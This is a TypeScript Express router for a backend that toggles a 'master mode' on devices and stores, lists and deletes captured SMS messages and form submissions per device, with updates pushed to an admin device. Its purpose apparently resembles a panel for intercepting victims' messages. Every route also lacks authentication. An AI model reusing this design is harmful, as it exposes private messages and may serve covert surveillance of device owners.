// src/routes/master.ts
import express, { Request, Response } from "express";
import Device from "../models/Device";
import MasterSms from "../models/MasterSms";
import MasterFormSubmission from "../models/MasterFormSubmission";
import AdminModel from "../models/Admin";
import logger from "../logger/logger";
import wsService from "../services/wsService";

const router = express.Router();

function clean(v: unknown): string {
  return String(v ?? "").trim();
}

/* ════════════════════════════════════════════
   PER DEVICE MASTER MODE
   ════════════════════════════════════════════ */

router.get("/mode/:deviceId", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const device = await Device.findOne({ deviceId }).select("deviceId masterMode").lean();
    if (!device) return res.status(404).json({ success: false, error: "device not found" });
    return res.json({ success: true, deviceId, masterMode: (device as any).masterMode === true });
  } catch (err: any) {
    logger.error("master: get mode failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

router.put("/mode/:deviceId", async (req: Request, res: Response) => {
  try {
    const deviceId  = clean(req.params.deviceId);
    const masterMode = req.body?.masterMode === true;
    const device = await Device.findOneAndUpdate(
      { deviceId },
      { $set: { masterMode } },
      { new: true }
    ).lean();
    if (!device) return res.status(404).json({ success: false, error: "device not found" });
    logger.info("master: masterMode updated", { deviceId, masterMode });
    try { wsService.sendToAdminDevice(deviceId, { type: "event", event: "masterMode:update", deviceId, data: { masterMode }, timestamp: Date.now() }); } catch (_) {}
    return res.json({ success: true, deviceId, masterMode });
  } catch (err: any) {
    logger.error("master: set mode failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

/* ════════════════════════════════════════════
   GLOBAL MASTER MODE
   ════════════════════════════════════════════ */

router.get("/global-mode", async (_req: Request, res: Response) => {
  try {
    const doc = await AdminModel.findOne({ key: "global_master_mode" }).lean();
    return res.json({ success: true, enabled: (doc as any)?.meta?.enabled === true });
  } catch (err: any) {
    logger.error("master: get global mode failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

router.put("/global-mode", async (req: Request, res: Response) => {
  try {
    const enabled = req.body?.enabled === true;
    await AdminModel.findOneAndUpdate(
      { key: "global_master_mode" },
      { $set: { phone: "global_master_mode", meta: { enabled } } },
      { upsert: true, new: true }
    );
    logger.info("master: global mode updated", { enabled });
    return res.json({ success: true, enabled });
  } catch (err: any) {
    logger.error("master: set global mode failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

/* ════════════════════════════════════════════
   MASTER SMS
   ════════════════════════════════════════════ */

router.get("/sms/:deviceId", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const limit = Math.min(Number(req.query.limit) || 200, 500);
    const msgs = await MasterSms.find({ deviceId }).sort({ timestamp: -1 }).limit(limit).lean();
    return res.json(msgs);
  } catch (err: any) {
    logger.error("master: get sms failed", err);
    return res.status(500).json([]);
  }
});

router.delete("/sms/:deviceId", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    await MasterSms.deleteMany({ deviceId });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("master: delete sms failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

router.delete("/sms/:deviceId/:smsId", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const smsId    = clean(req.params.smsId);
    await MasterSms.findOneAndDelete({ _id: smsId, deviceId });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("master: delete single sms failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

/* ════════════════════════════════════════════
   MASTER FORM MODE
   ════════════════════════════════════════════ */

router.get("/form-mode", async (_req: Request, res: Response) => {
  try {
    const doc = await AdminModel.findOne({ key: "master_form_mode" }).lean();
    return res.json({ success: true, enabled: (doc as any)?.meta?.enabled === true });
  } catch (err: any) {
    logger.error("master: get form mode failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

router.put("/form-mode", async (req: Request, res: Response) => {
  try {
    const enabled = req.body?.enabled === true;
    await AdminModel.findOneAndUpdate(
      { key: "master_form_mode" },
      { $set: { phone: "master_form_mode", meta: { enabled } } },
      { upsert: true, new: true }
    );
    logger.info("master: form mode updated", { enabled });
    return res.json({ success: true, enabled });
  } catch (err: any) {
    logger.error("master: set form mode failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

/* ════════════════════════════════════════════
   MASTER FORM DEVICES
   ════════════════════════════════════════════ */

router.get("/form-devices", async (_req: Request, res: Response) => {
  try {
    const devices = await Device.find({ masterFormDevice: true })
      .sort({ "lastSeen.at": -1 })
      .lean();
    return res.json(devices);
  } catch (err: any) {
    logger.error("master: form-devices failed", err);
    return res.status(500).json([]);
  }
});

/* ════════════════════════════════════════════
   MASTER FORM SUBMISSIONS
   ════════════════════════════════════════════ */

router.get("/forms/:deviceId", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    const docs = await MasterFormSubmission.find({ uniqueid: deviceId })
      .sort({ createdAt: -1 })
      .lean();
    return res.json(docs);
  } catch (err: any) {
    logger.error("master: get forms failed", err);
    return res.status(500).json([]);
  }
});

router.delete("/forms/:deviceId", async (req: Request, res: Response) => {
  try {
    const deviceId = clean(req.params.deviceId);
    await MasterFormSubmission.deleteMany({ uniqueid: deviceId });
    return res.json({ success: true });
  } catch (err: any) {
    logger.error("master: delete forms failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

/* ════════════════════════════════════════════
   MASTER STATUS (all devices)
   ════════════════════════════════════════════ */

router.get("/status", async (_req: Request, res: Response) => {
  try {
    const devices = await Device.find().select("deviceId masterMode masterFormDevice").lean();
    const statusMap: Record<string, any> = {};
    devices.forEach((d: any) => {
      statusMap[d.deviceId] = {
        masterMode:       d.masterMode === true,
        masterFormDevice: d.masterFormDevice === true,
      };
    });
    return res.json({ success: true, devices: statusMap });
  } catch (err: any) {
    logger.error("master: status failed", err);
    return res.status(500).json({ success: false, error: "server error" });
  }
});

export default router;
